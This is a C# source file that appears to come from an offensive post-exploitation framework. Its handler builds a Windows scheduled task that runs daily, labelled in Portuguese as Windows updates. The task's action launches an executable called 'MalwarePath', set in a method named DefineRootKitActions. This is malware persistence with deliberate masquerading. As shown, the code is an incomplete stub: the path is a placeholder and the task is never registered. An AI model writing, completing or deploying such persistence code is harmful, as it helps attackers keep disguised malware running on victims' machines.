using Barsa.Commons;
using MediatR;
using Microsoft.Win32.TaskScheduler;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Task = System.Threading.Tasks.Task;

namespace Caronte.Modules.PostExploitation.TaskScheduler
{
    public class TaskSchedulerCommandHandler : IRequestHandler<TaskSchedulerCommand, CommonResponse>
    {
        public Task<CommonResponse> Handle(TaskSchedulerCommand request, CancellationToken cancellationToken)
        {
            CommonResponse response = new();

            using (TaskService taskService = new())
            {
                var taskDefinition = taskService.NewTask();
                DefineTaskConfiguration(taskDefinition);
            }

            return Task.FromResult(response);
        }

        private void DefineTaskConfiguration(TaskDefinition taskDefinition)
        {
            taskDefinition.RegistrationInfo.Description = "Atualizações do windows";
            taskDefinition.Triggers.Add(new DailyTrigger() { DaysInterval = 1 });
            taskDefinition.Actions.AddRange(DefineRootKitActions());
        }

        private List<ExecAction> DefineRootKitActions()
        {
            return new List<ExecAction>()
            {
                new ExecAction("MalwarePath")
            };
        }
    }
}
